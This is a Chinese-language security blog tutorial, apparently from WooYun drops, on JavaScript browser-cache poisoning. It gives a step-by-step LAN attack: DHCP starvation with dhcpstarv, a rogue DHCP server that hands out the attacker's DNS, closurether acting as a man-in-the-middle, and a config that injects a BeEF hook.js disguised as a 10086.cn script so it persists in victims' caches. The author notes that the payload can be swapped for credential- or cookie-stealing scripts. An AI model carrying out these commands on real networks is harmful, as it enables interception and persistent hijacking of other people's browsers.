<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Javascript缓存投毒学习与实战</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Evi1cg</a> <span class="bull">·</span> <time title="2015/10/28 19:02" ui-time="" datetime="2015/10/28 19:02" class="published ng-binding ng-isolate-scope">2015/10/28 19:02</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 起因</h1><hr><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5cb8e4d1b8e5d9b9d5d11cb8e4d5b9f9e1b9f1fabbc8c3b9e4d4b9ded9b8e5ecb8e6dab8e4dcb8e4f62b3333252932">[email&#160;protected]</a> wifi,然后聊到了缓存投毒：</p><p><img alt="Alt text" img-src="751d8aa18fd04e00e3c725a172248d4cf7adae06.jpg"></p><p>然后看到wooyun wifi的这个说明：</p><blockquote><p>默认情况下该功能附带缓存投毒功能，将视图缓存所有的页面至2099年，您可以通过清除所有缓存以及浏览器数据来清除缓存投毒的影响。</p></blockquote><p>觉得这是个很不错的技术，所以查询谷爷，度娘，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f315786f1b5c48174975b3b6879b9681b78196929e">[email&#160;protected]</a> 大牛写的文章以后，就有了这篇文章，也算是一个总结。</p><h1>0x01 简介&amp;原理</h1><hr><p>js缓存投毒说白了就是受害者的浏览器缓存了一个被我们篡改的js脚本，如果缓存没有被清除，每次这个受害者访问网页的时候都会加载我们的js脚本。</p><p>那他是什么原理呢，很简单，其实就是浏览器的缓存机制，通常，为了加速各种静态资源的访问，各大网站会把一些静态资源缓存到客户端，这样一方面能提高客户体验，一方面也能减轻web服务器的压力。</p><p>浏览器缓存控制机制有两种：HTML Meta标签 以及 HTTP头信息，通常，web开发者可以在HTML页面的<code>&lt;head&gt;</code>节点中加入<code>&lt;meta&gt;</code>标签，比如：</p><pre><code>#!html
&lt;META HTTP-EQUIV="Pragma" CONTENT="no-cache"&gt;
</code></pre><p>代码的作用是告诉浏览器当前页面不被缓存，每次访问都需要去服务器拉取。 更多浏览器缓存机制我就不多说了，详情请<a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=0&amp;rsv_idx=1&amp;tn=94093035_hao_pg&amp;wd=%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6&amp;rsv_pq=bda55a250000c01c&amp;rsv_t=16c2REa31Ph2fOrx%2FvVo1EA1TZnUrNu0SMr6RKlUQoSfgPoQSEQ4lMtfbPnlNP3IIirnlUYn&amp;rsv_enter=1&amp;rsv_sug3=28&amp;rsv_sug1=21">戳我</a>。</p><p>要想预加载并缓存一个脚本很容易，只需<code>new Image().src=''</code>。当然有少数浏览器不支持，不过ie和chrome都是支持的。尽管js文件并不是一个图片，但仍然会缓存。</p><h1>0x02 准备工作</h1><hr><p><strong>安装node</strong></p><pre><code>wget https://codeload.github.com/nodejs/node/zip/master -O node-master.zip //下载
tar zxvf node-master.zip //解压
cd node-master
./configure
make //编译
make install //安装
</code></pre><p><strong>安装closurether</strong></p><pre><code>npm install -g closurether
</code></pre><p><strong>安装phantomjs</strong></p><p>下载安装，具体详见 <a href="http://phantomjs.org/download.html">phantomjs</a>,根据自己的系统进行选择。</p><h1>0x03 示例</h1><hr><p>测试过程中，使用了EtherDream大牛的<a href="https://github.com/EtherDream/mitm-http-cache-poisoning">demo</a>。具体过程如下。</p><p>下载安装：</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="394b56564d7952585550">[email&#160;protected]</a>:~/Desktop/# git clone https://github.com/EtherDream/mitm-http-cache-poisoning.git js
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="83f1ececf7c3e8e2efea">[email&#160;protected]</a>:~/Desktop/# cd js
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="acdec3c3d8ecc7cdc0c5">[email&#160;protected]</a>:~/Desktop/js/# npm install
</code></pre><p>更新缓存列表</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6e1c01011a2e050f0207">[email&#160;protected]</a>:~/Desktop/js# cd tool/
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="aedcc1c1daeec5cfc2c7">[email&#160;protected]</a>:~/Desktop/js/tool# phantomjs sniffer.js -i url.txt -o target.json
</code></pre><p><img alt="Alt text" img-src="4351f832ddb3d36536ebd720f7bad22e11778b11.jpg"></p><p>这个脚本的作用主要是为了找出各大网站中缓存最久的脚本资源，也就是我们要进行投毒的脚本链接。网站可以再url.txt里面添加，之后将生成的json复制到 asset 目录。</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="aedcc1c1daeec5cfc2c7">[email&#160;protected]</a>:~/Desktop/js/tool# cp -fr target.json ../asset/
</code></pre><p>运行</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8efce1e1facee5efe2e7">[email&#160;protected]</a>:~/Desktop/js/tool# cd ..
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3745585843775c565b5e">[email&#160;protected]</a>:~/Desktop/js# node index.js 
</code></pre><p>测试：</p><blockquote><p>浏览器代理 HTTP -> 127.0.0.1:8080 访问任意 HTTP。</p></blockquote><p><img alt="Alt text" img-src="fa3b46c2400bd12c678c827ffbd8e2617722b70b.jpg"></p><blockquote><p>关闭代理 打开126，360等网站（chrome测试成功，火狐失败）成功弹框。</p></blockquote><p><img alt="Alt text" img-src="52cd64132e9df584e40a25dd50f513cada835466.jpg"></p><p>关闭浏览器（不清除缓存），再次打开，访问360时依然会弹框。</p><p>其中，index.js实现了代理并替换原本静态脚本响应内容，并将响应头中<a href="http://baike.baidu.com/link?url=3QihY_fgx_CczpXn4NaaqfWzkaW9R77Fwt9CzzJ07kS26WG6N4eXRuwEB43a8TIXC5okH96u5CdCN8eEw-Eq1K">Cache-Control</a>字段改为<code>max-age=31536000</code>,如下图代码：</p><p><img alt="Alt text" img-src="82f7d0ef560ba0975a8b5d8424b4755d6a65822a.jpg"></p><p>而替换的脚本为asset目录下的stub.js，stub.js注入外部js关键代码如下图：</p><p><img alt="Alt text" img-src="07a7681357ea471f44f384d18cae596fe456e140.jpg"></p><p>其中<code>www.etherdream.com/hack/trojan.js</code> 为我们可控的js，上例中该js的内容为</p><pre><code>alert('xss run: ' + location.href);
</code></pre><p>我们可以通过修改该脚本内容来实现不同的功能。</p><h1>0x04 实战</h1><hr><p>此次实战在局域网中结合使用了dhcpstarv,isc-dhcp-server,beef以及closurether。攻击机使用了kali2.0。</p><p><strong>1.开启beef</strong></p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9eecf1f1eadef5fff2f7">[email&#160;protected]</a>:~# cd /usr/share/beef-xss/
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="55273a3a21153e34393c">[email&#160;protected]</a>:/usr/share/beef-xss# ./beef
</code></pre><p><strong>2.配置closurether</strong></p><p>获取最新的缓存列表</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="51233e3e25113a303d38">[email&#160;protected]</a>:~# cd /usr/local/lib/node_modules/closurether/tool/cache-sniffer
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f1839e9e85b19a909d98">[email&#160;protected]</a>:/usr/local/lib/node_modules/closurether/tool/cache-sniffer#  phantomjs sniffer.js
</code></pre><p>可以通过修改url.txt的内容来指定网站，此次测试过程中url中包含126以及360几个网站。 配置config.json文件如下:</p><pre><code>{
        "hacker_url": "http://192.168.1.108:3000/hook.js",
        "inject_url": "http://10086.cn/js10086/201306301200.js",
        "debug": false,
        "dump": false,
        "dumpPath": "./dump/"
}
</code></pre><p>其中<code>hacker_url</code>为我们的js地址，此处为beef的js地址，<code>inject_url</code> 为伪装的js地址。</p><p>运行closurether：</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b7c5d8d8c3f7dcd6dbde">[email&#160;protected]</a>:~# closurether
[SYS] local ip: 192.168.1.108
[DNS] running 0.0.0.0:53
[WEB] listening :::80
[WEB] listening :::443
</code></pre><p><strong>2.进行dhcp攻击</strong>:</p><p>下载<a href="http://sourceforge.net/projects/dhcpstarv/files/dhcpstarv/0.2.1/dhcpstarv-0.2.1.tar.gz/download">dhcpstarv</a>,安装：</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b2c0ddddc6f2d9d3dedb">[email&#160;protected]</a>:~/Desktop# tar zxvf dhcpstarv-0.2.1.tar.gz
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fd8f929289bd969c9194">[email&#160;protected]</a>:~/Desktop# cd dhcpstarv-0.2.1/
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d1a3bebea591bab0bdb8">[email&#160;protected]</a>:~/Desktop/dhcpstarv-0.2.1# ./configure
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="14667b7b60547f75787d">[email&#160;protected]</a>:~/Desktop/dhcpstarv-0.2.1# make 
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b0c2dfdfc4f0dbd1dcd9">[email&#160;protected]</a>:~/Desktop/dhcpstarv-0.2.1# make install
</code></pre><blockquote><p>Kali默认没有安装dhcpstarv，也可以用yersinia代替</p></blockquote><p>安装dhcp服务器：</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b5c7dadac1f5ded4d9dc">[email&#160;protected]</a>:~# apt-get install isc-dhcp-server
</code></pre><p>修改dhcp配置文件dhcpd.conf</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="493b26263d0922282520">[email&#160;protected]</a>:~# cd /etc/dhcp/
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4735282833072c262b2e">[email&#160;protected]</a>:/etc/dhcp# cp dhcpd.conf dhcpd.conf.bak
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cfbda0a0bb8fa4aea3a6">[email&#160;protected]</a>:/etc/dhcp# vim dhcpd.conf
</code></pre><p>修改DHCP分配的地址池，修改默认路由为原来路由的Ip，修改广播地址：</p><p><img alt="Alt text" img-src="22b152515fef2c09e13cf95af13609b9e984d9ef.jpg"></p><p>设置dns为开启了closurether的地址，如下图：</p><p><img alt="Alt text" img-src="60ea1d14248586eee8eefe4fae90d8082436b178.jpg"></p><blockquote><p>这里最好加一个正常的DNS服务器地址最为备选，防止我们的DNS服务对部分域名不解析</p></blockquote><p>开启操作系统的路由转发：</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5725383823173c363b3e">[email&#160;protected]</a>:~# echo "1" &gt; /proc/sys/net/ipv4/ip_forward
</code></pre><p>启动DHCP服务：</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="75071a1a01351e14191c">[email&#160;protected]</a>:/etc/dhcp# service isc-dhcp-server start
</code></pre><p>攻击正常的dhcp服务器，耗光ip资源:</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6a1805051e2a010b0603">[email&#160;protected]</a>:~# dhcpstarv -i eth0 -e 192.168.1.108
</code></pre><blockquote><p><code>-e参数</code>后面跟攻击者的ip</p></blockquote><p><img alt="Alt text" img-src="cde6c8a8fb7bb02dbc4c89f0026767a492cd9892.jpg"></p><p>然后当有客户端连入的时候，由于正常的DHCP服务器已经没有可分配的IP资源，新的内网主机就会使用攻击者DHCP服务器分配的IP，如下图：</p><p><img alt="Alt text" img-src="b4baa9be0ff3117a196349966b62990d2981bf32.jpg"></p><p>可以看到DNS已经改成了我们想要改的地址。</p><blockquote><p>这里说明下，如果可以直接进路由修改DNS，就直接进路由改，这样比较稳定，修改DNS为我们运行closurether的地址。</p></blockquote><p>主要工具运行截图：</p><p><img alt="Alt text" img-src="b79750190007cc1dc2462dc92fe6217a49dea6d1.jpg"></p><p>这时，被篡改DNS的客户端浏览网站的时候，就会运行我们植入的JS脚本，打开126以后，可以看到beef那里已经成功上线了：</p><p><img alt="Alt text" img-src="335adf0092d70e3daf006dd8a3e83b85e6004518.jpg"></p><p>而我们的js则已经被隐藏为10086的js</p><p><img alt="Alt text" img-src="1f7e80541edb529fb48655ecd503e12ebaf436eb.jpg"></p><p>将路由器重启，使用正常的DHCP为虚拟机分配ip地址，使用浏览器（未清理缓存）打开360：</p><p><img alt="Alt text" img-src="9c7c93e4b95162a42c2ed4827bbb603629175dc7.jpg"></p><p>这时可以看到beef上又上线了：</p><p><img alt="Alt text" img-src="6f4ad2412a1372d90bf7a7c5cf662ce8dbbb789e.jpg"></p><blockquote><p>beef的功能很强大，但不是本文的重点，当然js也可以换成其他，别如窃取某些网站的账号密码的js，或者获取客户端cookie的等等，这里就不多说了</p></blockquote><p>这样就达到了时光机的效果，虽然上网环境换了，但是由于浏览器的缓存没有清除，任然会执行我们的js，至此整个攻击完成。</p><h1>0x05 总结</h1><hr><p>从上面的整个过程可以得出的结论就是<code>不要随意通过不认识的wifi上网！</code></p><p>本文由evi1cg原创并首发于乌云drops，转载请注明</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/5253" rel="bookmark" id="re1">劫持SSH会话注入端口转发</a></li><li><a href="http://drops.wooyun.org/tips/413" rel="bookmark" id="re2">CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系统</a></li><li><a href="http://drops.wooyun.org/papers/653" rel="bookmark" id="re3">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li><li><a href="http://drops.wooyun.org/tips/7679" rel="bookmark" id="re4">php比较操作符的安全问题</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">老王</span> <span class="reply-time">2016-05-24 15:31:12</span></div><p></p><p>乌云大神，请问我可以转载吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">杨聪</span> <span class="reply-time">2015-11-16 10:05:15</span></div><p></p><p>互联网第三大好习惯勾上：退出时删除浏览记录 路由静态绑MAC</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">www.rehack.cn</span> <span class="reply-time">2015-11-09 12:45:33</span></div><p></p><p>收藏了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Taro</span> <span class="reply-time">2015-11-07 21:39:30</span></div><p></p><p>电脑设置每天自动清理缓存</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小福仔</span> <span class="reply-time">2015-11-06 17:18:00</span></div><p></p><p>6666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Tai7sy</span> <span class="reply-time">2015-11-02 13:00:02</span></div><p></p><p>感觉存活时间不是很长，电脑自动清空缓存啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">rambo</span> <span class="reply-time">2015-10-29 14:52:33</span></div><p></p><p>互联网第二大好习惯 私密网站，一定要在隐私窗口打开</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Evi1cg</span> <span class="reply-time">2015-10-29 11:55:53</span></div><p></p><p>@EtherDream 大牛好 哈哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Shark2013</span> <span class="reply-time">2015-10-29 11:36:51</span></div><p></p><p>屌屌屌</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">EtherDream</span> <span class="reply-time">2015-10-29 10:11:02</span></div><p></p><p>哈哈，终于有尝试的了 O(∩_∩)O</p><p>不过 closurether 那个 demo 早就不更新了，里面各种 bug，按照思路写一个也不麻烦。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Evi1cg</span> <span class="reply-time">2015-10-29 09:54:06</span></div><p></p><p>@phith0n 清除下缓存呗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">phith0n</span> <span class="reply-time">2015-10-29 00:43:35</span></div><p></p><p>自从连过一次wooyunwifi，又上了一下网以后，现在手机UC浏览器一进某些网站就弹alert(1)</p><p></p></div></div></div></div></div></main>